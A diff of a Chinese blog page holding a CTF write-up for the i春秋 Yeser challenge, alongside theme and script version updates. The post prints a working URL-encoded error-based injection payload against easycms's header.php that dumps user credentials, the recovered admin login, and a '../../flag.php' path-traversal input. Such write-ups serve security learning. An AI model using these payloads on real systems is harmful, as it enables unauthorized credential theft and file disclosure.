@@ -7,9 +7,10 @@
     <title>i春秋 &#34;百度杯&#34; 九月场 Yeser writeup | CherryGk&#39;s Blog | If you have any questions, please contact QQ1196821466 or leave message in the upper right.</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-    <meta name="keywords" content="xpath注入,命令执行">
+    <meta name="keywords" content="命令执行,xpath注入">
     <link rel="shortcut icon" href="/img/favicon.ico">
-    <link rel="stylesheet" href="/css/style.css?v=1.3.1">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
     
     <script type="text/javascript">
         // Data Center
@@ -25,7 +26,7 @@
         window.lazyScripts=[];
     </script>
     
-        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.1"></script>
+        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.2"></script>
     
 </head>
 
@@ -228,15 +229,15 @@
         <div class="post-content" id="post-content" itemprop="postContent">
             
             <p>打开来是一个不知道什么cms的页面：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/45802196.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/45802196.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/45802196.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>上cms指纹识别：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/67711801.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/67711801.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/67711801.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>但是貌似识别不出来，想想其他方法<br>比如搜一搜传递的变量名，也就是URL后面跟着的一大堆东西<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47690650.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47690650.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47690650.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>点进去看了看，跟题目的cms差不多<br>差不多确定是easycms了，搜一搜easycms漏洞<br>但是找到的大多数不能用，<br>最终还是看了大佬们写的writeup<br>在<code>URL/celive/live/header.php</code><br>处有一个xpath注入漏洞<a href="http://www.91ri.org/7147.html" target="_blank" rel="noopener">xpath注入科普</a><br>payload：<br>第一段：</p>
@@ -244,31 +245,31 @@
 <p>第二段：</p>
 <p><code>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><br><q>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520</q></xjxquery><br></code><br>这里得分成两段显示：</p>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/51587652.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/51587652.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/51587652.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/60060206.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/60060206.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/60060206.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure>
 <p>得到管理员的账户是<code>admin</code><br>密码是md5加密的<code>Yeser231</code><br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/22571721.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/22571721.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/22571721.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>登陆后台：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/1821806.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/1821806.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/1821806.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>找地方上传shell，自己找了很久没有找到地方，最后还是看的大佬的wp<br>在模版-&gt;当前模版编辑处<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/62323393.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/62323393.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/62323393.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>点击编辑，这个时候会把这个文件名传进去，<br>然后再显示出来这个文件的内容：<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/78331668.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/78331668.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/78331668.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 <p>这个时候直接看到提示：<code>flag在网站根目录下的flag.php中</code><br>把id换成<br><code>../../flag.php</code><br>即可得到flag:<br><figure class="image-box">
-                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47210201.jpg" alt="" title="" class="">
+                <a rel=i春秋 "百度杯" 九月场 Yeser writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47210201.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47210201.jpg" alt="" title="" class=""></a>
                 <p></p>
             </figure></p>
 
@@ -405,6 +406,21 @@
             
             
             
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
         </p>
     </div>
 </footer>
@@ -467,21 +483,33 @@
 
     
     <!-- main-js -->
-<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
-<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.1"></script>
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
 
 <script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
 
-<script type="text/javascript" src="/js/method.js?v=1.3.1"></script>
-<script type="text/javascript" src="/js/blog.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
 
 <!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
 
 
 
 
 
-<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.1"></script>
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
 <script type="text/javascript">
 	var search_path = "search.xml";
 	if (search_path.length === 0) {
@@ -493,17 +521,21 @@
 
 
 
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
     
         <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
 <script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.2"></script>
     
     
 
 
 
 <script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
-<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.1"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.2"></script>
 
 
 
@@ -542,5 +574,5 @@
 </script>
 
     
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"log":false});</script></body>
 </html>
